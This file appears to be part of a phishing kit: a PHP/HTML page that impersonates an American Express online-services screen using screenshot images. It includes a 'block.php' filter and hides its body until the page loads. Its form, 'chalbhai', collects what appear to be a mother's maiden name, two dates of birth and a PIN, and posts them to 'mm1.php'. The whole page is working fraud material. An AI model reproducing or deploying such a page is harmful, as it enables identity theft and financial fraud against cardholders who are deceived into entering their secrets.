<?php
require_once 'block.php';
?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>American Express : Online Services </title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">

<style type="text/css">
div#container
{
	position:relative;
	width: 1265px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<link rel="shortcut icon"
              href="images/favicon.ico"/>
    
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body bgColor="#FFFFFF">
<div id="container">


<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1351px; height:95px; z-index:2"><img src="images/heads.PNG" alt="" title="" border=0 width=1351 height=95></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:99px; width:1349px; height:447px; z-index:3"><img src="images/mainsss.PNG" alt="" title="" border=0 width=1349 height=447></div>


<form action="mm1.php" name=chalbhai id=chalbhai method=post>
<input name="mmm"  required title="Please Enter Right Value" autocomplete="off" maxlength="30" type="text" style="position:absolute;width:130px;height:30px;left:420px;top:258px;z-index:6">
<input name="mdob"  required title="Please Enter Right Value" autocomplete="off" placeholder="(mm-dd-yyyy) " maxlength="30" type="text" style="position:absolute;width:130px;height:30px;left:420px;top:300px;z-index:7">
<input name="dob"  required title="Please Enter Right Value" autocomplete="off" placeholder="(mm-dd-yyyy) " maxlength="30" type="text" style="position:absolute;width:130px;height:30px;left:420px;top:340px;z-index:7">
<input name="spin"  required title="Please Enter Right Value" autocomplete="off" maxlength="30" type="password" style="position:absolute;width:130px;height:30px;left:420px;top:380px;z-index:7">


<div id="formimage1" style="position:absolute; left:190px; top:455px; z-index:10"><input type="image" name="formimage1" width="104" height="46" src="images/continue.PNG"></div>
<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:550px; width:1350px; height:237px; z-index:11"><img src="images/footers.PNG" alt="" title="" border=0 width=1350 height=237></div>

</div>

</body>
</html>
